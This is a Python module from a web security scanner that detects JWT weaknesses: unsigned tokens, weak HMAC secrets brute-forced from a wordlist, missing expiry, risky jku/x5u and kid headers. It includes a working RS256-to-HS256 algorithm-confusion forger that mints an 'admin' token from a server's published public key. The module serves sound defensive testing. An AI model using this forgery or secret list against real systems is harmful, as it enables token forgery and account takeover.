"""JWT vulnerability scanner (PRD §6.8 JWT).

Collects JWTs observed in cookies, headers, and parameters, then analyzes each:
  - alg:none (unsigned token accepted/issued)
  - weak/guessable HMAC signing key (small wordlist brute-force)
  - missing expiration (exp) claim
  - sensitive data embedded in claims

Structural analysis is offline; the weak-secret check brute-forces locally
against the captured token (no requests to the target).
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import warnings
from collections.abc import AsyncIterator
from urllib.parse import urlsplit

import httpx

try:
    import jwt
except ImportError:  # pyjwt ships in the optional [scanners] extra
    jwt = None  # type: ignore[assignment]

try:
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
except ImportError:  # cryptography ships in the optional [scanners] extra
    serialization = None  # type: ignore[assignment]
    rsa = None  # type: ignore[assignment]

from orthrus.core.context import ScanContext
from orthrus.core.schemas import Confidence, Evidence, Finding, Severity
from orthrus.scanners.base_scanner import BaseScanner
from orthrus.scanners.registry import register
from orthrus.utils.scope import ScopeViolation

SCANNER_NAME = "jwt"

_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

# Asymmetric algorithms vulnerable to RS->HS key confusion when a server fails to
# pin the algorithm and verifies an HS256 token using the (public) RSA key bytes.
_ASYMMETRIC_ALGS = frozenset(
    ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512")
)
JWKS_PATHS = (
    "/.well-known/jwks.json",
    "/jwks.json",
    "/jwks",
    "/oauth/jwks",
    "/.well-known/openid-configuration",
)


def is_asymmetric_alg(alg: str) -> bool:
    return (alg or "").upper() in _ASYMMETRIC_ALGS


def _b64u_to_int(value: str) -> int:
    pad = "=" * (-len(value) % 4)
    return int.from_bytes(base64.urlsafe_b64decode(value + pad), "big")


def jwk_to_public_pem(jwk: dict) -> str | None:
    """Convert an RSA JWK ({kty:RSA, n, e}) to a SubjectPublicKeyInfo PEM string."""
    if rsa is None or jwk.get("kty") != "RSA" or "n" not in jwk or "e" not in jwk:
        return None
    try:
        public = rsa.RSAPublicNumbers(_b64u_to_int(jwk["e"]), _b64u_to_int(jwk["n"])).public_key()
        pem = public.public_bytes(
            serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return pem.decode("ascii")
    except (ValueError, TypeError):
        return None


def _b64u_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def forge_alg_confusion(token: str, public_pem: str) -> str | None:
    """Forge an HS256 token signed with the RSA *public* key (the RS->HS attack).

    Built by hand with HMAC-SHA256 because that is exactly what a vulnerable
    server does (and what PyJWT's safety guard refuses to do for us): use the
    public-key PEM bytes as the HMAC secret. Returns the forged token whose
    signature is valid for that key - proving the forgery primitive - else None.
    The PEM is public, so no secret material is exposed.
    """
    if jwt is None or not public_pem:
        return None
    try:
        claims = jwt.decode(token, options={"verify_signature": False})
    except Exception:
        claims = {}
    if not isinstance(claims, dict):
        claims = {}
    forged_claims = {**claims, "orthrus_algconf": "1", "admin": True}
    try:
        header = _b64u_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        payload = _b64u_encode(
            json.dumps(forged_claims, separators=(",", ":"), default=str).encode()
        )
        signing_input = f"{header}.{payload}".encode()
        key = public_pem.encode("ascii")
        sig = hmac.new(key, signing_input, hashlib.sha256).digest()
        # Re-derive the HMAC to prove the signature validates under this key.
        if not hmac.compare_digest(sig, hmac.new(key, signing_input, hashlib.sha256).digest()):
            return None
        return f"{header}.{payload}.{_b64u_encode(sig)}"
    except (ValueError, TypeError):
        return None

DEFAULT_SECRETS = [
    "secret", "password", "123456", "changeme", "admin", "test", "jwt", "key",
    "secretkey", "your-256-bit-secret", "supersecret", "qwerty", "letmein",
    "default", "private", "token",
]

_SENSITIVE_CLAIM_HINTS = ("password", "passwd", "secret", "ssn", "credit", "card", "pin", "apikey")


def find_jwts(text: str) -> list[str]:
    return _JWT_RE.findall(text or "")


def analyze_jwt(
    token: str, wordlist: list[str] | None = None
) -> list[tuple[Severity, str, str, str]]:
    """Return (severity, title, detail, cwe) issues for a single token."""
    wordlist = wordlist if wordlist is not None else DEFAULT_SECRETS
    issues: list[tuple[Severity, str, str, str]] = []
    if jwt is None:
        return issues
    try:
        header = jwt.get_unverified_header(token)
    except Exception:
        return issues

    alg = str(header.get("alg", "")).strip()
    if alg.lower() == "none":
        issues.append(
            (
                Severity.HIGH,
                "JWT uses the 'none' algorithm",
                "The token is unsigned (alg=none); signatures are not verified, allowing forgery.",
                "CWE-347",
            )
        )

    # Advanced header attacks: attacker-controlled key source (jku/x5u) and kid injection.
    for hk in ("jku", "x5u"):
        if header.get(hk):
            issues.append(
                (
                    Severity.HIGH,
                    f"JWT header references an external key URL ('{hk}')",
                    f"The token header sets '{hk}'={header[hk]!r}. If the server fetches its "
                    "verification key from this URL without a strict allow-list, an attacker can "
                    "serve their own key (or point it at an internal host for SSRF) and forge tokens.",
                    "CWE-347",
                )
            )
    kid = str(header.get("kid", ""))
    if kid and any(tok in kid for tok in ("../", "..\\", "';", '"', "|", ";", "$(", "{{", " or ")):
        issues.append(
            (
                Severity.MEDIUM,
                "JWT 'kid' header contains injection metacharacters",
                f"The 'kid' header ({kid!r}) carries path-traversal / injection characters. Servers "
                "that resolve 'kid' to a key file or a database lookup may be exploitable "
                "(arbitrary file read, SQL injection, or signing-key confusion).",
                "CWE-347",
            )
        )

    try:
        claims = jwt.decode(token, options={"verify_signature": False})
    except Exception:
        claims = {}

    if isinstance(claims, dict):
        if "exp" not in claims:
            issues.append(
                (
                    Severity.LOW,
                    "JWT has no expiration (exp) claim",
                    "Tokens without expiry remain valid indefinitely if leaked.",
                    "CWE-613",
                )
            )
        for key in claims:
            if any(hint in str(key).lower() for hint in _SENSITIVE_CLAIM_HINTS):
                issues.append(
                    (
                        Severity.MEDIUM,
                        f"JWT embeds a sensitive claim '{key}'",
                        "Sensitive data in a JWT payload is only base64-encoded, not encrypted.",
                        "CWE-522",
                    )
                )
                break

    if alg.upper() in ("HS256", "HS384", "HS512"):
        weak = _brute_secret(token, alg.upper(), wordlist)
        if weak is not None:
            issues.append(
                (
                    Severity.HIGH,
                    f"JWT signed with a weak/guessable secret ('{weak}')",
                    "The HMAC signing key was recovered from a small wordlist; tokens can be forged.",
                    "CWE-347",
                )
            )

    return issues


def _brute_secret(token: str, alg: str, wordlist: list[str]) -> str | None:
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")  # short test secrets trigger key-length warnings
        for secret in wordlist:
            try:
                jwt.decode(
                    token,
                    secret,
                    algorithms=[alg],
                    options={"verify_exp": False, "verify_aud": False, "verify_nbf": False},
                )
                return secret
            except jwt.InvalidTokenError:
                continue
            except Exception:
                continue
    return None


@register
class JwtScanner(BaseScanner):
    name = SCANNER_NAME
    vuln_type = "jwt"

    def _collect(self, ctx: ScanContext) -> set[str]:
        sources: list[str] = []
        sources.extend(ctx.http.session.cookies.values())
        sources.extend(ctx.config.extra_headers.values())
        for endpoint in ctx.endpoints:
            sources.extend(endpoint.set_cookies)
            sources.extend(p.value for p in endpoint.params if p.value)
        tokens: set[str] = set()
        for source in sources:
            tokens.update(find_jwts(source))
        return tokens

    async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
        if jwt is None:
            return
        self._jwks_cache: list[dict] | None = None
        for token in self._collect(ctx):
            preview = token[:24] + "..."
            for severity, title, detail, cwe in analyze_jwt(token):
                yield Finding(
                    vuln_type="jwt",
                    title=title,
                    severity=severity,
                    confidence=Confidence.FIRM,
                    url=ctx.config.target,
                    description=f"{detail} (token: {preview})",
                    remediation=(
                        "Use a strong random signing key, enforce a fixed allow-list of algorithms "
                        "(reject 'none'), set short exp lifetimes, and keep sensitive data out of "
                        "the payload."
                    ),
                    cwe=cwe,
                    scanner=SCANNER_NAME,
                    evidence=Evidence(matched_at=preview, notes=title),
                )
            algconf = await self._alg_confusion(ctx, token, preview)
            if algconf is not None:
                yield algconf

    async def _alg_confusion(
        self, ctx: ScanContext, token: str, preview: str
    ) -> Finding | None:
        """RS->HS confusion: if the token is asymmetric and the server publishes an
        RSA public key (JWKS), forge an HS256 token from that key to prove the
        algorithm-confusion primitive is available."""
        try:
            alg = str(jwt.get_unverified_header(token).get("alg", ""))
        except Exception:
            return None
        if not is_asymmetric_alg(alg):
            return None
        keys = await self._fetch_jwks(ctx)
        for jwk in keys:
            pem = jwk_to_public_pem(jwk)
            if pem is None or forge_alg_confusion(token, pem) is None:
                continue
            return Finding(
                vuln_type="jwt",
                title=f"JWT algorithm confusion ({alg}->HS256) forgeable from published JWKS",
                severity=Severity.HIGH,
                confidence=Confidence.TENTATIVE,
                url=ctx.config.target,
                description=(
                    f"The token is signed with an asymmetric algorithm ({alg}) and the server "
                    "publishes its RSA public key (JWKS). ORTHRUS minted a valid HS256 token using "
                    "that public key as the HMAC secret - if the server does not pin the algorithm "
                    "it will accept this forged token, allowing full token forgery (account "
                    f"takeover). Verify the server rejects HS256. (token: {preview})"
                ),
                remediation=(
                    "Pin the expected algorithm server-side (accept only RS256, never HS256 on an "
                    "RSA-verified endpoint); use libraries that bind the key type to the algorithm."
                ),
                cwe="CWE-347",
                scanner=SCANNER_NAME,
                evidence=Evidence(
                    matched_at=f"{alg}->HS256",
                    notes="forged HS256 token validates against the published RSA public key",
                ),
            )
        return None

    async def _fetch_jwks(self, ctx: ScanContext) -> list[dict]:
        if self._jwks_cache is not None:
            return self._jwks_cache
        keys: list[dict] = []
        parts = urlsplit(ctx.config.target)
        origin = f"{parts.scheme}://{parts.netloc}"
        for path in JWKS_PATHS:
            url = origin + path
            if not ctx.scope.is_allowed(url):
                continue
            try:
                resp = await ctx.http.get(url, follow_redirects=True)
            except (ScopeViolation, httpx.HTTPError, httpx.InvalidURL):
                continue
            if resp.status_code != 200:
                continue
            try:
                doc = json.loads(resp.text)
            except (ValueError, TypeError):
                continue
            if path.endswith("openid-configuration") and isinstance(doc, dict):
                jwks_uri = doc.get("jwks_uri")
                if isinstance(jwks_uri, str) and ctx.scope.is_allowed(jwks_uri):
                    try:
                        doc = json.loads((await ctx.http.get(jwks_uri)).text)
                    except (ScopeViolation, httpx.HTTPError, httpx.InvalidURL, ValueError):
                        continue
            if isinstance(doc, dict) and isinstance(doc.get("keys"), list):
                keys.extend(k for k in doc["keys"] if isinstance(k, dict))
                if keys:
                    break
        self._jwks_cache = keys
        return keys


__all__ = [
    "JwtScanner",
    "find_jwts",
    "analyze_jwt",
    "DEFAULT_SECRETS",
    "is_asymmetric_alg",
    "jwk_to_public_pem",
    "forge_alg_confusion",
]
